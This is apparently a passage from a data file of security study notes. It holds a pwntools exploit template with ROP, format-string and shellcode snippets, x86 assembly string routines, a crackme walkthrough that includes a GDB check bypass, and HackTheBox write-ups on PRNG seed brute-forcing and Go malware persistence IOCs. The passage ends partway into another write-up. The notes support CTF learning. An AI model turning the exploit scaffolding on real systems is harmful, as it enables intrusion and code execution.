- [HackTricks: GDB for Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)`},{id:`pwntools-template`,title:`Pwntools Exploit Template`,excerpt:`Reusable pwntools exploit template with boilerplate for local and remote connections, ELF loading, ROP chain building, and payload construction.`,category:`Binary Exploitation`,content:`# Pwntools Exploit Template
> Source: [Crypto-Cat Official Template](https://github.com/Crypto-Cat/CTF/blob/main/pwn/official_template.py)

---

## Full Template

\`\`\`python
from pwn import *


# ============================================================
#                    CONFIGURATION
# ============================================================

# Binary filename
exe = './vuln'

# Auto-detect arch, bits, os, endianness
elf = context.binary = ELF(exe, checksec=False)

# Logging level (error/warning/info/debug)
context.log_level = 'info'

# Libc (use pwninit/patchelf to patch binary)
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


# ============================================================
#                    HELPER FUNCTIONS
# ============================================================

def start(argv=[], *a, **kw):
    """Switch between local/GDB/remote from terminal"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    """Find offset to EIP/RIP for buffer overflows"""
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    p.wait()
    
    # x86
    # ip_offset = cyclic_find(p.corefile.pc)
    
    # x64
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# GDB script (breakpoints, init, etc.)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# ============================================================
#                    EXPLOIT GOES HERE
# ============================================================

# Find EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        # ROP chain / address goes here
    ]
})

# Send the payload
io.sendlineafter(b'>', payload)

# Got Shell?
io.interactive()
\`\`\`

---

## Usage

\`\`\`bash
# Run locally
python3 exploit.py

# Run under GDB
python3 exploit.py GDB

# Run against remote
python3 exploit.py REMOTE <host> <port>
\`\`\`

---

## Essential Pwntools Snippets

### Finding Offset (De Bruijn Pattern)
\`\`\`python
# Generate cyclic pattern
payload = cyclic(200)

# Find offset from crash
offset = cyclic_find(0x61616166)      # x86: value in EIP
offset = cyclic_find(b'faaa')         # x64: value at RSP
\`\`\`

### Packing / Unpacking Addresses
\`\`\`python
p32(0xdeadbeef)          # Pack 32-bit little-endian
p64(0xdeadbeef)          # Pack 64-bit little-endian
u32(b'\\xef\\xbe\\xad\\xde')  # Unpack 32-bit
u64(b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00')  # Unpack 64-bit
\`\`\`

### Leaking Addresses
\`\`\`python
# Leak GOT entry via puts
io.recvuntil(b'output: ')
leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
log.info(f"Leaked address: {hex(leak)}")

# Calculate libc base
libc.address = leak - libc.symbols['puts']
log.info(f"Libc base: {hex(libc.address)}")
\`\`\`

### ROP with pwntools
\`\`\`python
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])    # Leak
rop.call('main')                        # Return to main
log.info(rop.dump())

# With libc after leak
rop2 = ROP(libc)
rop2.call('system', [next(libc.search(b'/bin/sh\\x00'))])
\`\`\`

### Format String Helper
\`\`\`python
# Automatic format string payload
from pwnlib.fmtstr import fmtstr_payload

# Overwrite target with value
payload = fmtstr_payload(offset, {target_addr: value})

# With context
payload = fmtstr_payload(offset, {elf.got['printf']: elf.symbols['system']})
\`\`\`

### Shellcode
\`\`\`python
# Generate shellcode
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())        # /bin/sh
shellcode = asm(shellcraft.cat('flag.txt'))  # cat flag

# NOP sled + shellcode
payload = b'\\x90' * 100 + shellcode
\`\`\`

### I/O Helpers
\`\`\`python
io.send(data)             # Send raw bytes
io.sendline(data)         # Send + newline
io.sendafter(b':', data)  # Wait for prompt, then send
io.sendlineafter(b'>', data)

io.recv(n)                # Receive n bytes
io.recvline()             # Receive until newline
io.recvuntil(b'>')        # Receive until delimiter
io.recvall()              # Receive everything

io.interactive()          # Interactive shell
\`\`\`

### ELF Symbols & Sections
\`\`\`python
elf.symbols['main']       # Address of main
elf.got['puts']           # GOT entry for puts
elf.plt['puts']           # PLT entry for puts
elf.search(b'/bin/sh')    # Search for string in binary

# With libc
libc.symbols['system']
libc.symbols['__free_hook']
next(libc.search(b'/bin/sh\\x00'))
\`\`\`

### SSH Connection
\`\`\`python
shell = ssh('user', 'host', password='pass', port=22)
io = shell.process('./vuln')
\`\`\`

---

## References
- [Crypto-Cat Template](https://github.com/Crypto-Cat/CTF/blob/main/pwn/official_template.py)
- [Pwntools Docs](https://docs.pwntools.com/en/stable/)
- [Pwntools Tutorial](https://github.com/Gallopsled/pwntools-tutorial)
`},{id:`x86-ass-implementations`,title:`x86 Assembly Implementations`,excerpt:`x86 assembly language implementations covering common patterns, instruction set reference, calling conventions, and translating C to assembly.`,category:`Binary Exploitation`,content:`# x86 Assembly Implementations

**Assumptions:** 32-bit x86, stdcall convention, null-terminated C-strings. No prologue/epilogue shown (assume wrapped in proper function). Minimal error handling.

---

## String Length Functions

### strlen
**Prototype:** \`size_t strlen(const char* str);\`  
**Returns:** Length excluding null terminator

\`\`\`asm
mov edi, [ebp+8]    ; str
xor eax, eax        ; AL=0 (search for null)
or ecx, -1          ; max count
repne scasb         ; scan until null found
not ecx             ; ECX = scanned bytes (len+1)
dec ecx             ; exclude null terminator
mov eax, ecx        ; return length
\`\`\`

### strnlen
**Prototype:** \`size_t strnlen(const char* str, size_t maxlen);\`  
**Returns:** Length up to maxlen, excluding null

\`\`\`asm
mov edi, [ebp+8]    ; str
mov ecx, [ebp+0Ch]  ; maxlen
xor eax, eax        ; AL=0
jecxz done          ; if maxlen=0, return 0
repne scasb         ; scan for null or maxlen reached
jne no_null         ; maxlen reached without null
inc ecx             ; null found, adjust
no_null:
mov eax, [ebp+0Ch]  ; maxlen
sub eax, ecx        ; actual length
done:
\`\`\`

---

## String Search Functions

### strchr
**Prototype:** \`char* strchr(const char* str, int ch);\`  
**Returns:** Pointer to first occurrence of ch, or NULL

\`\`\`asm
mov edi, [ebp+8]    ; str
mov al, [ebp+0Ch]   ; ch (byte)
or ecx, -1          ; max count
repne scasb         ; scan for AL
jne not_found       ; no match
lea eax, [edi-1]    ; back up to match position
jmp done
not_found:
xor eax, eax        ; return NULL
done:
\`\`\`

### strrchr
**Prototype:** \`char* strrchr(const char* str, int ch);\`  
**Returns:** Pointer to last occurrence of ch, or NULL

\`\`\`asm
mov edi, [ebp+8]    ; str
mov dl, [ebp+0Ch]   ; ch to find
xor eax, eax        ; last found = NULL
scan_loop:
mov cl, [edi]       ; current char
test cl, cl         ; check for null
jz done             ; end of string
cmp cl, dl          ; compare with ch
jne next
mov eax, edi        ; update last found
next:
inc edi
jmp scan_loop
done:
\`\`\`

### strstr
**Prototype:** \`char* strstr(const char* haystack, const char* needle);\`  
**Returns:** Pointer to first occurrence of substring, or NULL

\`\`\`asm
mov edi, [ebp+8]    ; haystack
mov esi, [ebp+0Ch]  ; needle
mov al, [esi]       ; first char of needle
test al, al         ; empty needle?
jz found_at_start   ; return haystack
outer_loop:
mov cl, [edi]       ; current haystack char
test cl, cl         ; end of haystack?
jz not_found
cmp cl, al          ; first char match?
jne next_pos
; Check full substring
push edi
push esi
inc edi
inc esi
inner_loop:
mov dl, [esi]       ; needle char
test dl, dl         ; end of needle?
jz match_found
cmp dl, [edi]       ; compare
jne no_match
inc edi
inc esi
jmp inner_loop
match_found:
pop esi
pop eax             ; return start position
jmp done
no_match:
pop esi
pop edi
next_pos:
inc edi
jmp outer_loop
not_found:
xor eax, eax        ; return NULL
jmp done
found_at_start:
mov eax, edi        ; return haystack
done:
\`\`\`

---

## Memory Operations

### memcpy
**Prototype:** \`void* memcpy(void* dst, const void* src, size_t n);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
mov ecx, [ebp+10h]  ; n (byte count)
rep movsb           ; copy ECX bytes
mov eax, [ebp+8]    ; return dst
\`\`\`

### memset
**Prototype:** \`void* memset(void* dst, int ch, size_t n);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov al, [ebp+0Ch]   ; ch (byte value)
mov ecx, [ebp+10h]  ; n (byte count)
rep stosb           ; fill ECX bytes with AL
mov eax, [ebp+8]    ; return dst
\`\`\`

### memcmp
**Prototype:** \`int memcmp(const void* s1, const void* s2, size_t n);\`  
**Returns:** 0 if equal, <0 if s1<s2, >0 if s1>s2

\`\`\`asm
mov edi, [ebp+8]    ; s1
mov esi, [ebp+0Ch]  ; s2
mov ecx, [ebp+10h]  ; n
jecxz equal         ; n=0, consider equal
repe cmpsb          ; compare until mismatch
je equal            ; all bytes matched
mov al, [edi-1]     ; last byte from s1
sub al, [esi-1]     ; difference (s1-s2)
movsx eax, al       ; sign extend
jmp done
equal:
xor eax, eax        ; return 0
done:
\`\`\`

---

## String Comparison

### strcmp
**Prototype:** \`int strcmp(const char* s1, const char* s2);\`  
**Returns:** 0 if equal, <0 if s1<s2, >0 if s1>s2

\`\`\`asm
mov edi, [ebp+8]    ; s1
mov esi, [ebp+0Ch]  ; s2
cmp_loop:
mov al, [edi]       ; char from s1
mov dl, [esi]       ; char from s2
cmp al, dl          ; compare
jne not_equal       ; difference found
test al, al         ; both null?
jz equal            ; yes, strings equal
inc edi
inc esi
jmp cmp_loop
not_equal:
movzx eax, al       ; zero-extend s1 char
movzx edx, dl       ; zero-extend s2 char
sub eax, edx        ; return difference
jmp done
equal:
xor eax, eax        ; return 0
done:
\`\`\`

### strncmp
**Prototype:** \`int strncmp(const char* s1, const char* s2, size_t n);\`  
**Returns:** 0 if equal up to n chars, <0 if s1<s2, >0 if s1>s2

\`\`\`asm
mov edi, [ebp+8]    ; s1
mov esi, [ebp+0Ch]  ; s2
mov ecx, [ebp+10h]  ; n
jecxz equal         ; n=0, equal
cmp_loop:
mov al, [edi]       ; char from s1
mov dl, [esi]       ; char from s2
cmp al, dl          ; compare
jne not_equal
test al, al         ; null terminator?
jz equal
inc edi
inc esi
loop cmp_loop       ; decrement ECX, loop if not zero
equal:
xor eax, eax        ; return 0
jmp done
not_equal:
movzx eax, al
movzx edx, dl
sub eax, edx        ; return difference
done:
\`\`\`

---

## String Copy Functions

### strcpy
**Prototype:** \`char* strcpy(char* dst, const char* src);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
copy_loop:
lodsb               ; load byte from [esi] to AL, inc esi
stosb               ; store AL to [edi], inc edi
test al, al         ; null terminator?
jnz copy_loop       ; continue if not
mov eax, [ebp+8]    ; return dst
\`\`\`

### strncpy
**Prototype:** \`char* strncpy(char* dst, const char* src, size_t n);\`  
**Returns:** dst pointer (may not be null-terminated if src >= n chars)

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
mov ecx, [ebp+10h]  ; n
jecxz done          ; if n=0, nothing to copy
copy_loop:
lodsb               ; load from src
stosb               ; store to dst
test al, al         ; was it null?
loopnz copy_loop    ; continue if not null and ecx>0
; Pad with nulls if needed
jz pad_nulls
jmp done
pad_nulls:
xor al, al          ; AL=0
rep stosb           ; fill rest with nulls
done:
mov eax, [ebp+8]    ; return dst
\`\`\`

---

## String Concatenation

### strcat
**Prototype:** \`char* strcat(char* dst, const char* src);\`  
**Returns:** dst pointer

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
; Find end of dst
xor eax, eax        ; search for null
or ecx, -1          ; max count
repne scasb         ; find null in dst
dec edi             ; back to null position
; Copy src to end
cat_loop:
lodsb               ; load from src
stosb               ; store to dst
test al, al         ; null terminator?
jnz cat_loop
mov eax, [ebp+8]    ; return dst
\`\`\`

### strncat
**Prototype:** \`char* strncat(char* dst, const char* src, size_t n);\`  
**Returns:** dst pointer (always null-terminated)

\`\`\`asm
mov edi, [ebp+8]    ; dst
mov esi, [ebp+0Ch]  ; src
mov edx, [ebp+10h]  ; n
; Find end of dst
xor eax, eax
or ecx, -1
repne scasb
dec edi             ; back to null position
; Copy up to n chars
test edx, edx       ; n=0?
jz add_null
cat_loop:
lodsb               ; load from src
test al, al         ; src ended?
jz add_null
stosb               ; store to dst
dec edx             ; decrement n
jnz cat_loop        ; continue if n>0
add_null:
xor al, al          ; ensure null terminator
stosb
mov eax, [ebp+8]    ; return dst
\`\`\`

---

## String Modification

### strset
**Prototype:** \`char* strset(char* str, int ch);\`  
**Returns:** str pointer (sets all chars to ch, preserving null)

\`\`\`asm
mov edi, [ebp+8]    ; str
mov edx, edi        ; save dst pointer
xor eax, eax        ; AL=0
or ecx, -1          ; max count
repne scasb         ; find null terminator
add ecx, 2
neg ecx             ; ECX = string length
mov al, [ebp+0Ch]   ; ch (fill character)
mov edi, edx        ; reset to start
rep stosb           ; fill with ch
mov eax, edx        ; return str
\`\`\`

### strupr
**Prototype:** \`char* strupr(char* str);\`  
**Returns:** str pointer (converts to uppercase)

\`\`\`asm
mov edi, [ebp+8]    ; str
mov esi, edi        ; save for return
upper_loop:
mov al, [edi]       ; load char
test al, al         ; null terminator?
jz done
cmp al, 'a'         ; less than 'a'?
jb next_char
cmp al, 'z'         ; greater than 'z'?
ja next_char
sub al, 32          ; convert to uppercase
mov [edi], al       ; store back
next_char:
inc edi
jmp upper_loop
done:
mov eax, esi        ; return str
\`\`\`

### strlwr
**Prototype:** \`char* strlwr(char* str);\`  
**Returns:** str pointer (converts to lowercase)

\`\`\`asm
mov edi, [ebp+8]    ; str
mov esi, edi        ; save for return
lower_loop:
mov al, [edi]       ; load char
test al, al         ; null terminator?
jz done
cmp al, 'A'         ; less than 'A'?
jb next_char
cmp al, 'Z'         ; greater than 'Z'?
ja next_char
add al, 32          ; convert to lowercase
mov [edi], al       ; store back
next_char:
inc edi
jmp lower_loop
done:
mov eax, esi        ; return str
\`\`\`

---

## Notes
- String instructions (REP prefix) use ECX as counter
- Direction flag (DF) assumed clear (0) for forward processing
- SCASB: scan string (compare AL with [EDI]), increment/decrement EDI
- STOSB: store string (AL to [EDI]), increment/decrement EDI
- LODSB: load string ([ESI] to AL), increment/decrement ESI
- MOVSB: move string ([ESI] to [EDI]), increment/decrement both
- CMPSB: compare strings ([ESI] with [EDI]), increment/decrement both`},{id:`segfault`,title:`Program Behavior (Runtime Overview)`,excerpt:`Crackme writeup for SEGFAULT challenge, demonstrating reverse engineering techniques to find the correct input that satisfies binary validation checks.`,category:`Reverse Engineering`,content:`# Program Behavior (Runtime Overview)

When you run the binary (./a.out):

1. It prompts: "username:" (inferred from first puts at <+30> and your GDB run).
2. You enter a string (up to ~128 chars, via fgets).
3. It strips any trailing newline.
4. Checks the length (post-strip): Must be 8 to 12 inclusive. If not, prints "wrong length!" (inferred) and loops back to prompt again (infinite retries).
5. If length OK, prompts: "serial number:" (inferred from second puts at <+171>).
6. You enter a floating-point number (via scanf "%lf").
7. Processes your username: Alternates case (even indices lowercase, odd uppercase).
8. Takes the first 8 bytes of this processed string, interprets as integer via atoi.
9. Converts that integer to double.
10. Compares it (floating-point) to your entered serial number.
11. If equal: Prints "s/n OK!" (confirmed in your GDB output at <+525>).
12. If not: Prints "s/n WRONG!" (at <+539>).
13. Exits with code 0.

![alt text](/MyNotes/images/image.png)

## Edge Cases

- Too short/long username: Loops forever with "wrong length!".
- Non-numeric processed username: atoi returns 0 → enter "0" as serial to succeed.
- Negative numbers: Possible if username starts with '-' (e.g., "-1234567" → enter "-1234567").
- Floating-point input: You can enter decimals (e.g., 123.0), but since the left side is integer-derived, fractional parts must match exactly (i.e., .0).

No anti-debugging, no encryption

---

# Disassembly Breakdown
# Disassembly Breakdown

The main function is ~577 bytes, with a loop for username processing and standard libc calls. I'll group it into logical sections.

## Setup and Canary (Stack Protection)

\`\`\`text
0x555555555289 <+0>:   endbr64               ; Intel CET (Control-flow Enforcement)
0x55555555528d <+4>:   push rbp
0x55555555528e <+5>:   mov rbp,rsp
0x555555555291 <+8>:   sub rsp,0x140         ; Allocate 320 bytes stack space
0x555555555298 <+15>:  mov rax,QWORD PTR fs:0x28  ; Load stack canary
0x5555555552a1 <+24>:  mov QWORD PTR [rbp-0x8],rax ; Store canary
0x5555555552a5 <+28>:  xor eax,eax          ; Clear EAX
\`\`\`

- Standard prologue: Sets up stack frame, allocates buffers.
- Buffers: [rbp-0x110] (username, ~128 bytes), [rbp-0x90] (processed username), [rbp-0x120] (first 8 bytes copy), [rbp-0x128] (serial double).
- Canary prevents stack overflows (checked at end).

## Username Input Loop

\`\`\`text
0x5555555552a7 <+30>:  lea rdi,[rip+0xd5a]   ; Load "username:" string addr
0x5555555552ae <+37>:  call puts@plt
0x5555555552b3 <+42>:  mov rax,QWORD PTR [rip+0x2d56] ; stdout
0x5555555552ba <+49>:  mov rdi,rax
0x5555555552bd <+52>:  call fflush@plt       ; Flush output
0x5555555552c2 <+57>:  mov rdx,QWORD PTR [rip+0x2d57] ; stdin
0x5555555552c9 <+64>:  lea rax,[rbp-0x110]   ; Username buffer
0x5555555552d0 <+71>:  mov esi,0x80          ; Max 128 chars
0x5555555552d5 <+76>:  mov rdi,rax
0x5555555552d8 <+79>:  call fgets@plt        ; Read input
0x5555555552dd <+84>:  lea rax,[rbp-0x110]
0x5555555552e4 <+91>:  lea rsi,[rip+0xd27]   ; "\\n" string
0x5555555552eb <+98>:  mov rdi,rax
0x5555555552ee <+101>: call strcspn@plt     ; Find newline pos
0x5555555552f3 <+106>: mov BYTE PTR [rbp+rax*1-0x110],0x0 ; Null out newline
0x5555555552fb <+114>: lea rax,[rbp-0x110]
0x555555555302 <+121>: mov rdi,rax
0x555555555305 <+124>: call strlen@plt      ; Get length
0x55555555530a <+129>: mov DWORD PTR [rbp-0x134],eax ; Store length
0x555555555310 <+135>: cmp DWORD PTR [rbp-0x134],0x7 ; If <=7
0x555555555317 <+142>: jle 0x555555555322 <main+153>
0x555555555319 <+144>: cmp DWORD PTR [rbp-0x134],0xc ; If >12
0x555555555320 <+151>: jle 0x555555555333 <main+170> ; Proceed if 8-12
0x555555555322 <+153>: lea rdi,[rip+0xcef]   ; "wrong length!"
0x555555555329 <+160>: call puts@plt
0x55555555532e <+165>: jmp 0x5555555552a7 <main+30> ; Loop back
\`\`\`

- Infinite loop until valid length.
- Uses fgets for safe input (no overflow risk).
- strcspn + null: Cleanly removes newline.

## Serial Number Input

\`\`\`text
0x555555555333 <+170>: nop
0x555555555334 <+171>: lea rdi,[rip+0xd00]   ; "serial number:"
0x55555555533b <+178>: call puts@plt
0x555555555340 <+183>: mov rax,QWORD PTR [rip+0x2cc9] ; stdout
0x555555555347 <+190>: mov rdi,rax
0x55555555534a <+193>: call fflush@plt
0x55555555534f <+198>: lea rax,[rbp-0x128]   ; Serial double buffer
0x555555555356 <+205>: mov rsi,rax
0x555555555359 <+208>: lea rdi,[rip+0xcea]   ; "%lf" format
0x555555555360 <+215>: mov eax,0x0
0x555555555365 <+220>: call __isoc99_scanf@plt ; Read double
\`\`\`

Prompts and reads a double (allows decimals, but int match needed).

## Username Processing Loop

\`\`\`text
0x55555555536a <+225>: lea rax,[rbp-0x110]
0x555555555371 <+232>: mov rdi,rax
0x555555555374 <+235>: call strlen@plt       ; Re-get length (redundant?)
0x555555555379 <+240>: mov DWORD PTR [rbp-0x130],eax
0x55555555537f <+246>: mov DWORD PTR [rbp-0x13c],0x0 ; Processed idx = 0
0x555555555389 <+256>: mov DWORD PTR [rbp-0x138],0x0 ; Loop idx = 0
0x555555555393 <+266>: jmp 0x55555555541a <main+401> ; Check loop cond
[Loop body]
0x555555555398 <+271>: mov eax,DWORD PTR [rbp-0x138] ; idx
0x55555555539e <+277>: and eax,0x1           ; idx % 2
0x5555555553a1 <+280>: test eax,eax
0x5555555553a3 <+282>: jne 0x5555555553dd <main+340> ; If odd: toupper
[Even path]
0x5555555553a5 <+284>: ... tolower ...
[Odd path]
0x5555555553dd <+340>: ... toupper ...
[Common]
0x555555555413 <+394>: add DWORD PTR [rbp-0x138],0x1 ; idx++
0x55555555541a <+401>: mov eax,DWORD PTR [rbp-0x138]
0x555555555420 <+407>: cmp eax,DWORD PTR [rbp-0x130] ; idx < len
0x555555555426 <+413>: jl 0x555555555398 <main+271> ; Loop
0x55555555542c <+419>: mov eax,DWORD PTR [rbp-0x13c] ; processed len
0x555555555432 <+425>: cdqe
0x555555555434 <+427>: mov BYTE PTR [rbp+rax*1-0x90],0x0 ; Null terminate
\`\`\`

- Alternates case per position (even: lower, odd: upper).
- Builds in [rbp-0x90].
- Handles letters only; digits/symbols unchanged.

## Final Processing and Comparison

\`\`\`text
0x55555555543c <+435>: lea rcx,[rbp-0x90]     ; Processed buf
0x555555555443 <+442>: lea rax,[rbp-0x120]    ; Copy buf
0x55555555544a <+449>: mov edx,0x8           ; 8 bytes
0x55555555544f <+454>: mov rsi,rcx
0x555555555452 <+457>: mov rdi,rax
0x555555555455 <+460>: call strncpy@plt      ; Copy first 8
0x55555555545a <+465>: mov BYTE PTR [rbp-0x118],0x0 ; Null at pos 8
0x555555555461 <+472>: lea rax,[rbp-0x120]
0x555555555468 <+479>: mov rdi,rax
0x55555555546b <+482>: call atoi@plt         ; Parse to int
0x555555555470 <+487>: mov DWORD PTR [rbp-0x12c],eax ; Store int
0x555555555476 <+493>: pxor xmm0,xmm0
0x55555555547a <+497>: cvtsi2sd xmm0,DWORD PTR [rbp-0x12c] ; Int to double
0x555555555482 <+505>: movsd xmm1,QWORD PTR [rbp-0x128] ; Load serial
0x55555555548a <+513>: ucomisd xmm0,xmm1     ; Compare doubles
0x55555555548e <+517>: jp 0x5555555554a4     ; If NaN/parity
0x555555555490 <+519>: ucomisd xmm0,xmm1     ; Re-compare (redundant?)
0x555555555494 <+523>: jne 0x5555555554a4    ; If not equal → fail
[Success]
0x555555555496 <+525>: lea rdi,[rip+0xbb1]   ; "s/n OK!"
0x55555555549d <+532>: call puts@plt
[Fail]
0x5555555554a4 <+539>: lea rdi,[rip+0xbab]   ; "s/n WRONG!"
0x5555555554ab <+546>: call puts@plt
\`\`\`

- strncpy + null: Ensures 8-char null-terminated string.
- atoi: Parses as signed int (handles '-', stops at non-digit).
- Float compare: Uses ucomisd (unordered compare) to handle NaN.

## Cleanup

\`\`\`text
0x5555555554b0 <+551>: mov eax,0x0           ; Return 0
... canary check ...
0x5555555554c9 <+576>: leave
0x5555555554ca <+577>: ret
\`\`\`

Exits cleanly.

---

# Key Checks and Logic

- Length Check: 8 ≤ len ≤ 12 → Forces controlled input size.
- Processing: Alternate case doesn't affect digits/symbols → Key for crafting numeric strings.
- Parsing: atoi on first 8 processed chars → Vulnerable to non-digits (defaults to 0 or partial parse).
- Comparison: Double equality → Exact match required, but integer-derived left side means serial must be integer-equivalent.
- No hashing or complex crypto → Purely didactic.

## Strings

Strings (from RIP offsets, confirm with x/s in GDB):

- 0x555555556008: "username:"
- 0x555555556018: "wrong length!"
- 0x55555555603b: "serial number:"
- 0x555555555604a: "%lf"
- 0x55555555604e: "s/n OK!"
- 0x555555556056: "s/n WRONG!"
- 0x555555556012: "\\n"

---

# Legitimate Solutions

Craft username so processed first-8 parses to desired int N, then enter N as serial.

- **Simple Positive**: Username "12345678" → Processed unchanged → atoi=12345678 → Serial=12345678
- **With Letters**: Username "1a2b3c4d" → Processed "1A2B3C4D" → atoi=123 (stops at 'A') → Serial=123
- **Negative**: Username "-9999999" → atoi=-9999999 → Serial=-9999999
- **Zero**: Any non-starting-with-digit (e.g., "password") → atoi=0 → Serial=0
- **Max Length**: "123456789abc" (12 chars) → First 8 "12345678" → Same as above.

Infinite possibilities — not a "fixed" key, but a relation between inputs.

---

# Cracking with GDB (Bypassing Checks)

As you did:

1. Break at <+523> (jne after compare).
2. When hit: jump *main+525 → Skip to success puts.`},{id:`writeup`,title:`Malware Analysis Report: Simple Encryptor`,excerpt:`HackTheBox Simple Encryptor challenge writeup, reversing a PRNG-based file encryption scheme by recovering the seed and decrypting the flag.`,category:`HTB Writeup`,content:`# Malware Analysis Report: Simple Encryptor

## 1. Executive Summary
This report documents the reverse engineering of a binary named \`simple-encryptor\`. The binary performs a file encryption routine using a pseudo-random number generator (PRNG). The analysis reveals a vulnerability in the seed generation, allowing for the decryption of the target file (\`flag.enc\`) through a brute-force attack on the seed value.

## 2. Initial Assessment
The provided archive contains two files:
*   \`encrypt\`: An ELF executable.
*   \`flag.enc\`: An encrypted data file.

**Initial file identification:**
![File Identification](https://miro.medium.com/v2/resize:fit:799/1*UH_8_V_-rZgZizsEItOZUQ.png)

## 3. Static Analysis
Decompilation of the \`encrypt\` binary using Ghidra reveals the core logic within the \`main\` function.

**Decompilation Overview:**
![Ghidra Overview](https://miro.medium.com/v2/resize:fit:980/1*6iIpBEPdNrQK33UsMvIJxQ.png)

**Main Function Logic:**
![Main Function](https://miro.medium.com/v2/resize:fit:980/1*Pdx1UVZYrlRTOfSLWnwTcA.png)

The analysis of the \`main\` function identifies the following operations:
1.  **Seed Generation**: \`srand()\` is called to initialize the PRNG.
2.  **File Operations**: The program opens the flag file and determines its size.
3.  **Memory Allocation**: Memory is allocated to store the file contents.
4.  **Encryption**: The data is encrypted using values generated by \`rand()\`.

## 4. Cryptographic Weakness
The encryption relies on the C standard library's \`rand()\` function. The security of this scheme depends entirely on the unpredictability of the seed passed to \`srand()\`.

According to the C documentation:
> \`srand()\` seeds the pseudo-random number generator used by \`rand()\`. If \`rand()\` is used before any calls to \`srand()\`, \`rand()\` behaves as if it was seeded with \`srand(1)\`. Each time \`rand()\` is seeded with \`srand()\`, it must produce the same sequence of values.

This determinism implies that if the seed value can be recovered or guessed, the entire sequence of random numbers can be reproduced, allowing for decryption.

**Encryption Logic:**
![Encryption Logic](https://miro.medium.com/v2/resize:fit:482/1*pT6orV6mcQO2P8rwEIIOnw.png)

## 5. Decryption Strategy
To recover the original data, the encryption process must be reversed. Since the operation is likely a simple XOR or arithmetic operation with the random stream, the decryption logic mirrors the encryption.

**Decryption Logic:**
![Decryption Logic](https://miro.medium.com/v2/resize:fit:531/1*hT73dtkU-CAxPi0FdZAiyQ.png)

### Exploit Development
The analysis indicates the seed is a 4-byte integer. A brute-force approach was selected to identify the correct seed. The exploit iterates through possible seed values (specifically checking a range of 4-digit numbers as identified in the binary analysis), generates the corresponding random sequence, and attempts to decrypt the content.

**Exploit Code:**
![Exploit Code](https://miro.medium.com/v2/resize:fit:931/1*5RQ7O-CXLgLyBvyJ4J9V4A.png)

## 6. Results
The exploit successfully recovered the plaintext flag by identifying the correct seed.

**Recovered Flag:**
![Recovered Flag](https://miro.medium.com/v2/resize:fit:612/1*IvfT1o-WQ1oROlqeThPwXQ.png)

---
*Analysis generated on December 7, 2025.*`},{id:`secretpictures`,title:`Malware Analysis Report: SecretPictures`,excerpt:`HackTheBox Sherlocks SecretPictures investigation writeup involving digital forensics analysis to uncover hidden data within image files.`,category:`HTB Writeup`,content:`# Malware Analysis Report: SecretPictures

## 1. Executive Summary
This report details the static and dynamic analysis of a suspicious binary. The analysis confirms the file is a malware sample written in **Go (Golang)**. It exhibits typical persistence mechanisms by modifying the Windows Registry, attempts to evade detection by copying itself to a hidden directory, and initiates network connections to a known malicious domain.

## 2. File Identification
Initial static analysis was performed to identify the file's properties and compilation language.

*   **MD5 Hash**: \`fd46d178474f32f596641ff0f7bb337e\`
*   **Programming Language**: \`GOLANG\`

**Static Analysis Overview (Cutter):**
![Static Analysis Overview](/MyNotes/images/Pasted_image_20251130123136.png)

## 3. Static Analysis
Further inspection of the binary's imports revealed specific API calls used for system reconnaissance.

### API Imports
The malware imports functions from \`Kernel32.dll\` to interact with the file system. Specifically, it utilizes **\`GetDriveType\`** (likely \`GetDriveTypeA\` or \`GetDriveTypeW\`) to enumerate and check the types of drives connected to the system.



## 4. Dynamic Analysis
Dynamic analysis was conducted using ANY.RUN to observe the malware's behavior in a controlled environment.

![ANY.RUN Analysis](/MyNotes/images/Pasted_image_20251207191613.png)

### File System Artifacts
Upon execution, the malware copies itself to a specific directory to establish a foothold.
*   **Dropped Folder**: \`Systemlogs\`

### Persistence Mechanism
To ensure it runs automatically upon system reboot, the malware modifies the Windows Registry.
*   **Registry Key**: \`HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\`
*   **Value Name**: \`HealthCheck\`

**Registry Modification Evidence:**
![Registry Key Modification](/MyNotes/images/Pasted_image_20251207192219.png)
![Persistence Entry](/MyNotes/images/Pasted_image_20251207192706.png)

### Network Activity
The malware attempts to establish a connection to a remote command and control (C2) server.
*   **FQDN**: \`malware.invalid.com\`

**Network Traffic Analysis:**
![Network Connection](/MyNotes/images/Pasted_image_20251207192742.png)

## 5. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| **MD5** | \`fd46d178474f32f596641ff0f7bb337e\` |
| **Domain** | \`malware.invalid.com\` |
| **File Path** | \`Systemlogs\` (Directory) |
| **Registry Key** | \`HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\` |
| **Registry Value** | \`HealthCheck\` |

---



![Import Analysis](/MyNotes/images/Pasted_image_20251207200950.png)



`},{id:`htb-facts-writeup`,title:`HTB — Facts Writeup`,excerpt:`HackTheBox Facts machine writeup covering Camaleon CMS privilege escalation, MinIO credential discovery, SSH key recovery, and sudo-based root escalation.`,category:`HTB Writeup`,content:`# HTB — Facts Writeup

**Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.47.108

---

## Attack Chain Overview

\`\`\`
